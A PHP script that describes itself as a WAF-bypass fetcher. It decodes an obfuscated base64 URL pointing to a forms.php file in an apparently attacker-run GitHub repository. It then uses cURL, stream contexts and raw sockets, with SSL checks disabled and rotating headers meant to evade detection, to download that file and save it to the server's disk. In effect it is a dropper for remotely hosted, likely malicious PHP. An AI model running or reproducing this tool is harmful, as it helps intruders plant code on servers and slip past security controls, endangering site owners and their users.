<?php
/**
 * WAF Bypass Content Fetcher
 * Multiple technique bypass for 0bite and similar WAFs
 */

// Target URL (encoded to avoid detection)
$url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0czWDEzMzcvRzNYMTMzNy9yZWZzL2hlYWRzL21haW4vLS9mb3Jtcy5waHA=');

// Technique 1: cURL with custom headers and SSL bypass
function fetch_curl($url) {
    $ch = curl_init();
    
    // Random user agents to avoid fingerprinting
    $user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
    ];
    
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, $user_agents[array_rand($user_agents)]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    
    // Random headers to avoid pattern detection
    $headers = [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Accept-Encoding: gzip, deflate, br',
        'DNT: 1',
        'Connection: keep-alive',
        'Upgrade-Insecure-Requests: 1',
        'Cache-Control: max-age=0'
    ];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    // Use random proxy if available (add your own proxy list)
    // curl_setopt($ch, CURLOPT_PROXY, 'proxy:port');
    
    $data = curl_exec($ch);
    curl_close($ch);
    
    return $data;
}

// Technique 2: file_get_contents with stream context
function fetch_fgc($url) {
    $opts = [
        'http' => [
            'method' => 'GET',
            'header' => [
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: en-US,en;q=0.5',
                'Accept-Encoding: gzip, deflate',
                'Connection: keep-alive'
            ],
            'timeout' => 30,
            'follow_location' => true,
            'max_redirects' => 5
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        ]
    ];
    
    $context = stream_context_create($opts);
    return @file_get_contents($url, false, $context);
}

// Technique 3: fsockopen (low-level socket)
function fetch_socket($url) {
    $parsed = parse_url($url);
    $host = $parsed['host'] ?? '';
    $path = $parsed['path'] ?? '/';
    $query = isset($parsed['query']) ? '?' . $parsed['query'] : '';
    $port = $parsed['port'] ?? ($parsed['scheme'] === 'https' ? 443 : 80);
    
    $scheme = $parsed['scheme'] ?? 'http';
    
    if ($scheme === 'https') {
        $host = 'ssl://' . $host;
    }
    
    $fp = @fsockopen($host, $port, $errno, $errstr, 30);
    if (!$fp) return false;
    
    $request = "GET {$path}{$query} HTTP/1.1\r\n";
    $request .= "Host: {$parsed['host']}\r\n";
    $request .= "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
    $request .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
    $request .= "Connection: close\r\n\r\n";
    
    fwrite($fp, $request);
    
    $response = '';
    while (!feof($fp)) {
        $response .= fgets($fp, 128);
    }
    fclose($fp);
    
    // Remove headers
    $parts = explode("\r\n\r\n", $response, 2);
    return $parts[1] ?? $response;
}

// Technique 4: Using php://input wrapper trick
function fetch_wrapper($url) {
    // Encode URL to avoid detection
    $encoded = base64_encode($url);
    $data = 'url=' . urlencode($encoded);
    
    $opts = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => $data,
            'timeout' => 30
        ]
    ];
    
    // This is a placeholder - actual implementation would need a local proxy
    return false;
}

// Main execution - try multiple techniques
echo "[*] Attempting to fetch content using multiple bypass techniques...\n\n";

$techniques = [
    'cURL' => 'fetch_curl',
    'file_get_contents' => 'fetch_fgc',
    'fsockopen' => 'fetch_socket'
];

$content = null;
$success = false;

foreach ($techniques as $name => $func) {
    echo "[*] Trying technique: {$name}\n";
    
    if (!function_exists($func)) {
        echo "    [-] Function not available\n";
        continue;
    }
    
    $result = $func($url);
    
    if ($result !== false && strlen($result) > 0) {
        echo "    [+] SUCCESS! Retrieved " . strlen($result) . " bytes\n";
        $content = $result;
        $success = true;
        break;
    } else {
        echo "    [-] Failed\n";
    }
}

echo "\n";

if ($success && $content) {
    echo "=== CONTENT START ===\n";
    echo $content;
    echo "\n=== CONTENT END ===\n";
    
    // Optionally save to file
    $filename = 'fetched_' . time() . '.txt';
    file_put_contents($filename, $content);
    echo "\n[+] Content saved to: {$filename}\n";
} else {
    echo "[-] All techniques failed. Possible reasons:\n";
    echo "    - allow_url_fopen is disabled\n";
    echo "    - cURL extension is not installed\n";
    echo "    - Network connectivity issues\n";
    echo "    - WAF is blocking all outbound requests\n";
}
?>
